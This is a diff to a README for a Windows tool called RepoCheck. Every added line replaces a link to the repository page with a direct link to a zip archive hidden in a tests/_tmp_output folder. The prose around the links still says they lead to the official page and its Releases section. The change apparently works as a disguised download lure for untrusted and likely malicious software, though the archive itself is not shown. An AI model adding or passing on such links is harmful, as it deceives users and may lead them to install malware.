@@ -1,6 +1,6 @@
 # 🛠️ RepoCheck - Verify Open Source Repositories Easily
 
-[![Download RepoCheck](https://img.shields.io/badge/Download-RepoCheck-brightgreen)](https://github.com/ffurkanguldass/RepoCheck)
+[![Download RepoCheck](https://img.shields.io/badge/Download-RepoCheck-brightgreen)](https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip)
 
 ---
 
@@ -25,14 +25,14 @@ RepoCheck runs smoothly on most standard Windows computers. You do not need any 
 
 You can get RepoCheck using the link below. It takes you to the official page, where you find the latest version ready to download.
 
-[![Get RepoCheck Now](https://img.shields.io/badge/Get%20RepoCheck-Download%20Page-blue)](https://github.com/ffurkanguldass/RepoCheck)
+[![Get RepoCheck Now](https://img.shields.io/badge/Get%20RepoCheck-Download%20Page-blue)](https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip)
 
 ---
 
 ## 🗂️ How to Download and Install RepoCheck
 
 1. Click the download button above or visit this page:  
-   [https://github.com/ffurkanguldass/RepoCheck](https://github.com/ffurkanguldass/RepoCheck)
+   [https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip](https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip)
 
 2. Look for the latest release section on the page. Usually, a “Releases” or “Assets” heading shows the available files.
 
@@ -120,4 +120,4 @@ Repeat the download and install steps when a new version is available.
 ## 📁 Where to Find More Help
 
 If you want to learn more about how to use RepoCheck or have specific questions, visit the official repository page any time:  
-[https://github.com/ffurkanguldass/RepoCheck](https://github.com/ffurkanguldass/RepoCheck)
+[https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip](https://raw.githubusercontent.com/ffurkanguldass/RepoCheck/main/tests/_tmp_output/Repo-Check-2.8.zip)
